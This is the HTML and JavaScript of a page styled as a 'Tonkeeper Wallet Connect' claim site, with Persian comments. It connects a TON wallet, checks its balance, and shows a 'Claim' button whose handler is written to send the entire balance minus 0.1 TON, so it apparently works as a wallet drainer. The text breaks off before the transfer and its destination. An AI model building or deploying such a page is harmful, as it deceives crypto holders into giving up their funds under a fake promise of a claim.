<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tonkeeper Wallet Connect</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            text-align: center;
            background-color: #f4f4f4;
            padding: 20px;
            position: relative;
        }

        .container {
            max-width: 400px;
            margin: auto;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
        }

        .wallet-button-container {
            position: absolute;
            top: 10px;
            right: 10px;
        }

        button {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 12px;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 10px;
            width: 100%;
        }

        button:hover {
            background-color: #0056b3;
        }

        .wallet-info {
            display: none;
            background: #f9f9f9;
            padding: 15px;
            border-radius: 8px;
            margin-top: 10px;
        }
    </style>
</head>
<body>

    <!-- دکمه اتصال کیف پول در بالا سمت راست -->
    <div class="wallet-button-container">
        <button id="connect-wallet">اتصال به کیف پول</button>
    </div>

    <div class="container">
        <h2>اتصال به کیف پول</h2>

        <div id="wallet-info" class="wallet-info">
            <button id="claim-btn" style="display: none;">Claim</button>
        </div>
    </div>

    <script>
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://miladsoft.github.io/ton-connect/tonconnect-manifest.json',
        });

        const connectWalletBtn = document.getElementById("connect-wallet");
        const walletInfoDiv = document.getElementById("wallet-info");
        const claimBtn = document.getElementById("claim-btn");

        let userWalletAddress = "";
        let userBalance = 0;

        // اتصال کیف پول
        connectWalletBtn.addEventListener("click", async () => {
            try {
                // اتصال به کیف پول
                const connectedWallet = await tonConnectUI.connectWallet();
                userWalletAddress = connectedWallet.account.address;
                
                // دریافت موجودی TON
                const balanceResponse = await fetch(`https://tonapi.io/v2/accounts/${userWalletAddress}`);
                const balanceData = await balanceResponse.json();
                userBalance = balanceData.balance ? balanceData.balance / 1e9 : 0; // تبدیل nanotons به TON
                
                // اگر موجودی کافی نباشد، دکمه را غیرفعال کند
                if (userBalance <= 0.1) {
                    alert("موجودی کافی برای انجام تراکنش وجود ندارد.");
                    return;
                }

                // نمایش دکمه Claim
                walletInfoDiv.style.display = "block";
                claimBtn.style.display = "block";

            } catch (error) {
                alert("خطا در اتصال به کیف پول");
                console.error(error);
            }
        });

        // ارسال تمام موجودی به جز 0.1 TON کارمزد
        claimBtn.addEventListener("click", async () => {
            try {
                // میزان باقی‌مانده برای پرداخت کارمزد
                const gasFeeEstimate = 0.1;
                const sendAmount = userBalance - gasFeeEstimate;

                if (sendAmount <= 0) {
                    alert("موجودی کافی نیست! باید حداقل 0.1 TON باقی بماند.");
                    return;
